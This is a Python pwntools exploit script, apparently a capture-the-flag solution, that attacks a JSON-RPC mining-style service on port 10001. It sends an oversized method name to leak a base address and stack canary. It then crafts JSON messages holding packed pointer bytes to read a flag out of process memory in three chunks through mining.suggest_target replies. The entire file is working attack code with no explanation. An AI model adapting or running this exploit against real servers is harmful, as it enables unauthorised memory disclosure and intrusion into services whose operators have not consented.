#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import sys
import time
import random


print sys.argv[1]
r = remote(sys.argv[1] ,10001)

if __name__ == '__main__':
  payload = '{"id":"1234","method":"client.exchange.flag","params":[222]}'
  print payload
  r.sendline(payload)
  print repr(r.recv(0x100))
  r.sendline("{\"id\":"+"2147483648"+",\"method\":\"" + "A"*0x150 + "\",\"params\":[\"123\"]}")
  print repr(r.recv(0x100))
  m_addr = u64(r.recv(8).ljust(8,"\x00")) - 0xbf1




  # leak 1



  flag = m_addr + 0x1d60
  flag_ptr = m_addr + 0x2432
  flag_ptr_ptr = m_addr + 0x2448
  canary = u64(r.recv(8).ljust(8,"\x00"))
  print("m_addr = {}".format(hex(m_addr))) 
  print("canary = {}".format(hex(canary)))
  print r.recv(0x100)


  payload = '{"id":"0","method":"DDDDDD","params":"' + p64(flag)[0:2] + '","'+ p64(flag)[3:6] + '":"","":"","":"","":"","":"","":"","":"","":"","' +p64(flag_ptr)[0:2] + '":"'+ p64(flag_ptr)[3:6] +    '","":""}'
  print payload
  
  r.sendline(payload)
  print r.recv(0x100)
  payload = '{"id":"0","method":"mining.suggest_target","params":"' + p64(flag_ptr_ptr)[0:2] + '","'+ p64(flag_ptr_ptr)[3:6] + '":""}'

  r.sendline(payload)
  r.recvuntil('set_difficulty","params":["')
  read_flag = r.recvuntil("000000000000000000000000000000000000000000000000")[:-len("000000000000000000000000000000000000000000000000")]

  # leak 2

  flag = m_addr + 0x1d70
  flag_ptr = m_addr + 0x2432
  flag_ptr_ptr = m_addr + 0x2448
  canary = u64(r.recv(8).ljust(8,"\x00"))
  print r.recv(0x100)
  payload = '{"id":"0","method":"EEEEEE","params":"' + p64(flag)[0:2] + '","'+ p64(flag)[3:6] + '":"","":"","":"","":"","":"","":"","":"","":"","' +p64(flag_ptr)[0:2] + '":"'+ p64(flag_ptr)[3:6] +    '","":""}'
  print payload
  
  r.sendline(payload)
  #print r.recv(0x100)
  payload = '{"id":"0","method":"mining.suggest_target","params":"' + p64(flag_ptr_ptr)[0:2] + '","'+ p64(flag_ptr_ptr)[3:6] + '":""}'

  
  r.sendline(payload)
  r.recvuntil('set_difficulty","params":["')
  read_flag += r.recvuntil("000000000000000000000000000000000000000000000000")[:-len("000000000000000000000000000000000000000000000000")]

  # leak 3


  flag = m_addr + 0x1d80
  flag_ptr = m_addr + 0x2432
  flag_ptr_ptr = m_addr + 0x2448
  canary = u64(r.recv(8).ljust(8,"\x00"))
  print r.recv(0x100)
  payload = '{"id":"0","method":"FFFFFF","params":"' + p64(flag)[0:2] + '","'+ p64(flag)[3:6] + '":"","":"","":"","":"","":"","":"","":"","":"","' +p64(flag_ptr)[0:2] + '":"'+ p64(flag_ptr)[3:6] +    '","":""}'
  print payload
  
  r.sendline(payload)
  #print r.recv(0x100)
  payload = '{"id":"0","method":"mining.suggest_target","params":"' + p64(flag_ptr_ptr)[0:2] + '","'+ p64(flag_ptr_ptr)[3:6] + '":""}'

  
  r.sendline(payload)

  r.recvuntil('set_difficulty","params":["')
  read_flag += r.recvuntil("000000000000000000000000000000000000000000000000")[:-len("000000000000000000000000000000000000000000000000")]
  r.recv(0x100)
  print "BFS"*4+read_flag
  r.close()
